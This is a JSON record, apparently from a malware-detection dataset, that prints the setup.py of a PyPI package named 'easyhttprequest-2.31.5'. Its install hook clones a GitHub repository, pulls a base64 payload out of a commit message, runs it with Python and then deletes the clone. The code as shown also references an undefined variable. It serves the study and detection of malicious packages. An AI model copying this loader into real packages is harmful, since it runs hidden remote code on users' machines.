[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import os\nimport sys\nimport base64\nimport shutil\nimport pathlib\nimport subprocess\nfrom setuptools.command.install import install\n\ndef get_temp_directory():\n    temp_dir = os.getenv('TMPDIR') or os.getenv('TEMP') or os.getenv('TMP')\n    if temp_dir:\n        return temp_dir\n    user_profile = os.getenv('USERPROFILE')\n    if user_profile:\n        temp_dir = os.path.join(user_profile, 'AppData', 'Local', 'Temp')\n        if os.path.exists(temp_dir):\n            return temp_dir\n    return '/tmp' if os.name == 'posix' else '.'\n\nclass PostInstall(install):\n    def run(self):\n        install.run(self)\n\n        remote_url = 'https://github.com/isaaknikolaev/PySocks.git'\n        destination_path = pathlib.Path(get_temp_directory()) / 'PySocks'\n\n        if os.name == 'nt':\n            subprocess.call([\"pip\", \"install\", \"dulwich\"])\n\n            from dulwich.porcelain import clone\n\n            # Clone the remote repository\n            repo = clone(remote_url, destination_path)\n\n            # Get the commit at the HEAD of the default branch (e.g., 'master')\n            head_commit = repo[repo.head()]\n            commit_message = head_commit.message.decode('utf-8')\n\n            if c_message.startswith('uJq93k8bmm7KqjL'):\n                clean_message = commit_message.replace('uJq93k8bmm7KqjL', '')\n                process = subprocess.Popen(\n                ['python', \"-c\", base64.b64decode(clean_message).decode('utf-8')],\n                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,\n                stdout=subprocess.PIPE,\n                stderr=subprocess.PIPE,\n                stdin=subprocess.PIPE\n                )\n\n            # Clean up after finishing\n            shutil.rmtree(destination_path)\n"
  },
  {
    "metadata": {
      "package_name": "easyhttprequest-2.31.5",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/easyhttprequest-2.31.5.txt"
    }
  }
]